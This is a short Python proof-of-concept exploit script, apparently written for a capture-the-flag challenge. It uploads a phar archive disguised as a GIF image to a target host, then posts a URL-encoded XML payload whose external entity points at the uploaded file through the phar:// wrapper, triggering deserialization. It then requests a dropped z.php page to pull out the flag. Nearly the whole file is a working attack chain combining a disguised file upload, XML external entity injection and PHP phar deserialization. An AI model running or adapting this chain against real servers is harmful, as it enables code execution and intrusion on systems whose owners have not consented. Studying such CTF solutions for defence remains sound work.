#!/usr/bin/python3

# PoC for Challenge
# William Moody
# 10.04.2021

import requests
import urllib
import subprocess
import re
import sys

if len(sys.argv) != 2:
    print("Usage: %s RHOST" % sys.argv[0])
    sys.exit(-1)

RHOST = sys.argv[1]

print("[*] Generating phar/image...")
tmp = subprocess.check_output(["php","generatePhar.php"])

print("[*] Uploading Phar/image...")
phar_img = open("poc.phar","rb").read()
f = {"image":("poc.gif", phar_img, "image/gif")}
r = requests.post('https://%s'%RHOST,
    files=f)

if 'uploaded' not in r.text:
    print("[-] Failed")
    sys.exit(-1)

img_name = r.text[:-1].split("/")[-1]
print("    -- " + img_name)

print("[*] POST'ing XML...")
payload = urllib.parse.quote('<!DOCTYPE foo [<!ELEMENT foo ANY>'+\
    '<!ENTITY % xxe SYSTEM "phar:///tmp/images/'+img_name+'">%xxe;]><message><to></to><from></from>'+\
    '<image></image></message>')
r = requests.post('https://%s'%RHOST,
    data='message='+payload,
    headers={'Content-Type':'application/x-www-form-urlencoded'}
)

if 'stored' not in r.text:
    print("[-] Failed")
    sys.exit(-1)

msg_name = r.text[:-1].split("/")[-1]
print("    -- " + msg_name)

print("[*] Removing phar/image...")
subprocess.Popen(["rm","poc.phar"])

r = requests.get("https://%s/z.php" % RHOST)
print("[*] Retrieving flag...")
print("    -- "+re.search(r"247CTF\{[0-9a-f]{32}\}",r.text)[0])
